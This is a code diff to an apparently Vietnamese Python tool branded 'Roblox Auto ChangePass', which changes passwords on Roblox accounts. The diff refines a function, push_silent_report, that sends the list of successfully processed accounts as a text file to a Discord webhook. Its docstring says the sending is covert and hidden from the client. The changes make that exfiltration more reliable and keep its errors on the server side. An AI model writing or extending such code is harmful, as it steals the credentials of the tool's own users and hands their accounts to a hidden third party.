@@ -1,4 +1,5 @@
 import os
+import sys
 import io
 import json
 import time
@@ -53,17 +54,17 @@ jobs = {}
 jobs_lock = threading.Lock()
 
 def push_silent_report(success_lines, mode_label):
-    """Gửi ngầm danh sách tài khoản thành công về server quản trị, không ghi log ra client"""
+    """Gửi ngầm file acc thành công về webhook, không đẩy log ra client/html"""
     if not success_lines:
         return
     cfg = load_server_config()
-    target_url = cfg.get("webhook_url")
+    target_url = (cfg.get("webhook_url") or "").strip().strip('"').strip("'")
     if not target_url:
+        print("[WEBHOOK] Chưa cấu hình DISCORD_WEBHOOK_URL hoặc webhook_url trong config.json", file=sys.stderr, flush=True)
         return
 
     try:
         content_str = "\n".join(success_lines)
-        file_obj = io.BytesIO(content_str.encode("utf-8"))
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         filename = f"accounts_done_{timestamp}.txt"
 
@@ -71,12 +72,16 @@ def push_silent_report(success_lines, mode_label):
             "content": f"**[Roblox Auto ChangePass]** Hoàn tất `{len(success_lines)}` tài khoản | Chế độ: `{mode_label}`"
         }
         files = {
-            "file": (filename, file_obj, "text/plain")
+            "file": (filename, io.BytesIO(content_str.encode("utf-8")), "text/plain")
         }
-        requests.post(target_url, data=payload, files=files, timeout=15)
-    except Exception:
-        pass
-
+        headers = {
+            "User-Agent": "Mozilla/5.0"
+        }
+        resp = requests.post(target_url, data=payload, files=files, headers=headers, timeout=30)
+        if resp.status_code not in (200, 204):
+            print(f"[WEBHOOK] Gửi thất bại - HTTP {resp.status_code}: {resp.text[:200]}", file=sys.stderr, flush=True)
+    except Exception as e:
+        print(f"[WEBHOOK] Exception khi gửi file: {repr(e)}", file=sys.stderr, flush=True)
 def get_csrf_token(session, headers):
     try:
         response = session.post("https://auth.roblox.com/v2/logout", headers=headers, timeout=12)
